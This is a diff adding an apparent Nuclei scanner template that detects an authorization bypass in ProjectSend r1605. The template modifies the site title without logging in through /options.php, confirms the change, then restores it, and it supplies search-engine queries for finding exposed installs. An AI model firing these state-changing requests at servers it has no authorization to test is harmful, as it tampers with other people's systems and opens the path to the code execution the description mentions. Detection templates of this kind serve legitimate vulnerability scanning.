@@ -1,0 +1,109 @@
+id: projectsend-auth-bypass
+
+info:
+  name: ProjectSend <= r1605 - Improper Authorization
+  author: DhiyaneshDK
+  severity: high
+  description: |
+    An improper authorization check was identified within ProjectSend version r1605 that allows an attacker to perform sensitive actions such as enabling user registration and auto validation, or adding new entries in the whitelist of allowed extensions for uploaded files. Ultimately, this allows to execute arbitrary PHP code on the server hosting the application.
+  reference:
+    - https://www.projectsend.org/
+    - https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="ProjectSend"
+    shodan-query: html:"ProjectSend"
+  tags: misconfig,projectsend,auth-bypass,intrusive
+
+variables:
+  string: "{{randstr}}"
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "projectsend")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: csrf
+        group: 1
+        regex:
+          - 'name="csrf_token" value="([0-9a-z]+)"'
+        internal: true
+
+      - type: regex
+        name: title
+        group: 1
+        regex:
+          - '<title>Log in &raquo; ([0-9a-zA-Z]+)<\/title>'
+        internal: true
+
+  - raw:
+      - |
+        POST /options.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrf}}&section=general&this_install_title={{string}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{string}}")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /options.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrf}}&section=general&this_install_title={{title}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{title}}")'
+        condition: and
+# digest: 4b0a00483046022100f78e76c2eedc23d884676e33844239b58dd83837be0482b71d30b6d8567a5ea0022100b4d9e33205ff1db6c9a992948f7dcf4dea7d3eb9fb7240353a93a1326919a132:922c64590222798bb761d5b6d8e72950
